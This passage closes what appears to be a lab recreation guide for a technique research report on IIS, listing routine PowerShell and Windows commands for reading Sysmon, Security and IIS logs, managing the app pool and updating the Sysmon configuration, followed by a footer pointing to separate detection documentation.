# View Sysmon events filtered by Event ID (e.g., Process Create = 1)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=1]]" -MaxEvents 10

# View recent Security events (Process Creation = 4688)
Get-WinEvent -LogName "Security" -FilterXPath "*[System[EventID=4688]]" -MaxEvents 10

# View IIS logs
Get-Content "C:\inetpub\logs\LogFiles\W3SVC1\*" -Tail 20

# List IIS worker processes
Get-Process w3wp -ErrorAction SilentlyContinue

# Recycle the default app pool (useful for Procedure C testing)
Restart-WebAppPool -Name "DefaultAppPool"

# Check Sysmon config
C:\Tools\Sysmon\Sysmon64.exe -c

# Update Sysmon config without reinstalling
C:\Tools\Sysmon\Sysmon64.exe -c C:\Tools\Sysmon\trr0000_sysmon_config.xml

# Check current audit policy
auditpol /get /category:*

# Export Sysmon log to XML for offline analysis
wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Tools\Sysmon\sysmon_export.evtx
```

---

*TRR0000 Lab Recreation Guide — Procedures A, B, and C. Detection specifications are documented separately in `TRR0000_Detection_Methods.md`. Application Initialization variant and SIEM rule implementation remain as future exercises.*
